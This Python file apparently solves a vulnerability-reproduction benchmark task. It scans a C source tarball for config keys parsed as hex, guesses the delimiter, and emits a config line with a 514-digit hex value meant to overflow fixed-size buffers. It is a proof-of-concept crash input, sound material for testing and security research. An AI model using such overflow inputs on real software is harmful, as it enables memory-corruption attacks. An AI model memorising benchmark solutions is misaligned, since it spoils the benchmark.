import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


_TEXT_EXTS = {
    ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".hxx",
    ".y", ".l", ".yy",
    ".py", ".sh", ".mk", ".cmake",
    ".txt", ".md", ".rst",
    ".conf", ".cfg", ".ini", ".cnf", ".rc", ".config",
    ".in", ".inc",
}


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return True
    if b"\x00" in data:
        return False
    sample = data[:8192]
    bad = 0
    for b in sample:
        if b < 9 or (13 < b < 32) or b == 127:
            bad += 1
    return bad / max(1, len(sample)) < 0.02


def _read_sources_from_tar(src_path: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size > 2_000_000:
                    continue
                ext = os.path.splitext(fn)[1].lower()
                if ext not in _TEXT_EXTS and ("conf" not in fn.lower() and "cfg" not in fn.lower() and "ini" not in fn.lower()):
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                if not _is_probably_text(data):
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                out[os.path.relpath(p, src_path)] = txt
        return out

    if not tarfile.is_tarfile(src_path):
        return out

    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            if m.size > 2_000_000:
                continue
            name = m.name
            base = os.path.basename(name).lower()
            ext = os.path.splitext(base)[1].lower()
            if ext not in _TEXT_EXTS and ("conf" not in base and "cfg" not in base and "ini" not in base):
                if ext not in {".c", ".h", ".cc", ".cpp", ".hpp"}:
                    continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            if not _is_probably_text(data):
                continue
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                continue
            out[name] = txt
    return out


def _extract_string_literals(text: str) -> List[str]:
    # Very simple C string literal extractor: handles escapes.
    lits: List[str] = []
    i = 0
    n = len(text)
    while i < n:
        if text[i] != '"':
            i += 1
            continue
        i += 1
        sb = []
        while i < n:
            c = text[i]
            if c == "\\" and i + 1 < n:
                sb.append(text[i + 1])
                i += 2
                continue
            if c == '"':
                i += 1
                break
            sb.append(c)
            i += 1
        s = "".join(sb)
        lits.append(s)
    return lits


def _score_key(k: str) -> int:
    k_l = k.lower()
    score = 0
    if not (1 <= len(k) <= 64):
        return -10
    if re.fullmatch(r"[A-Za-z0-9_.-]+", k) is None:
        return -5
    if "hex" in k_l:
        score += 12
    if "key" in k_l:
        score += 10
    for w in ("seed", "salt", "hash", "mac", "uuid", "guid", "id", "token", "secret", "iv", "nonce", "serial", "license"):
        if w in k_l:
            score += 6
    if k_l in ("hex", "key", "secret", "token", "id", "mac"):
        score += 5
    return score


def _find_hex_related_keys(texts: Dict[str, str]) -> List[Tuple[int, str]]:
    keys_score: Dict[str, int] = {}
    # Collect from likely config parser areas, bias by proximity to base16 usage.
    base16_pat = re.compile(
        r"(strto(?:l|ul|ll|ull)\s*\([^;]{0,300}?,\s*[^;]{0,300}?,\s*16\s*\))"
        r"|(\bisxdigit\s*\()"
        r"|(\bhex[a-zA-Z0-9_]*\s*\()"
        r"|(\"%2hhx\")"
        r"|(\bsscanf\s*\([^;]{0,300}\"[^\"]*%[0-9]*[xX][^\"]*\")",
        re.MULTILINE,
    )
    cmp_pat = re.compile(
        r"\b(strcasecmp|strcmp|strncmp|strncasecmp)\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"([^\"]{1,64})\"\s*(?:,\s*\d+\s*)?\)",
        re.MULTILINE,
    )
    cmp_pat_rev = re.compile(
        r"\b(strcasecmp|strcmp|strncmp|strncasecmp)\s*\(\s*\"([^\"]{1,64})\"\s*,\s*([A-Za-z_]\w*)\s*(?:,\s*\d+\s*)?\)",
        re.MULTILINE,
    )

    for path, txt in texts.items():
        is_cfg_like = ("config" in path.lower() or "cfg" in path.lower() or "conf" in path.lower() or "ini" in path.lower())
        for m in base16_pat.finditer(txt):
            pos = m.start()
            lo = max(0, pos - 1200)
            hi = min(len(txt), pos + 1200)
            w = txt[lo:hi]
            for cm in cmp_pat.finditer(w):
                lit = cm.group(3)
                sc = _score_key(lit)
                if sc < 0:
                    continue
                if is_cfg_like:
                    sc += 4
                keys_score[lit] = max(keys_score.get(lit, -10), sc)
            for cm in cmp_pat_rev.finditer(w):
                lit = cm.group(2)
                sc = _score_key(lit)
                if sc < 0:
                    continue
                if is_cfg_like:
                    sc += 4
                keys_score[lit] = max(keys_score.get(lit, -10), sc)

    # Fall back: global string literals with heuristic scoring.
    if not keys_score:
        for path, txt in texts.items():
            is_cfg_like = ("config" in path.lower() or "cfg" in path.lower() or "conf" in path.lower() or "ini" in path.lower())
            for lit in _extract_string_literals(txt):
                sc = _score_key(lit)
                if sc < 0:
                    continue
                if is_cfg_like:
                    sc += 2
                if sc >= 8:
                    keys_score[lit] = max(keys_score.get(lit, -10), sc)

    scored = sorted(((v, k) for k, v in keys_score.items()), reverse=True)
    return scored


def _infer_delim(texts: Dict[str, str]) -> str:
    eq_score = 0
    ws_score = 0
    colon_score = 0
    for path, txt in texts.items():
        t = txt
        weight = 2 if ("config" in path.lower() or "cfg" in path.lower() or "conf" in path.lower() or "ini" in path.lower()) else 1
        eq_score += weight * (t.count("strchr(") + t.count("strtok(") + t.count("\"%[^=]") + t.count("=\"") + t.count("='") + t.count(" = ") + t.count("=\t"))
        eq_score += weight * (t.count("='") + t.count("=\""))
        colon_score += weight * (t.count(":") // 50)
        ws_score += weight * (t.count("\"%s %s\"") + t.count("\"%s\t%s\"") + t.count(" %s %s") + t.count("\t%s\t%s"))
        if re.search(r"%\s*\[[^\]]*=\s*[^\]]*\]", t):
            eq_score += weight * 2
        if re.search(r"%\s*\[[^\]]*:\s*[^\]]*\]", t):
            colon_score += weight * 2

    if eq_score >= max(ws_score, colon_score):
        return "="
    if colon_score >= ws_score:
        return ":"
    return " "


def _even_at_least(n: int) -> int:
    if n < 0:
        n = 0
    if n % 2 == 1:
        n += 1
    return n


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = _read_sources_from_tar(src_path)

        key = "hex"
        scored_keys = _find_hex_related_keys(texts)
        if scored_keys:
            key = scored_keys[0][1]

        delim = _infer_delim(texts)

        # Conservative length: likely overflows common 512-byte string buffers or 256-byte binary decode buffers.
        # Use even number of hex digits.
        hex_len = 514
        hex_len = _even_at_least(hex_len)

        hex_value = b"0" * hex_len

        if delim == " ":
            line = (key + " ").encode("ascii", "ignore") + hex_value + b"\n"
        else:
            line = (key + delim + " ").encode("ascii", "ignore") + hex_value + b"\n"

        return line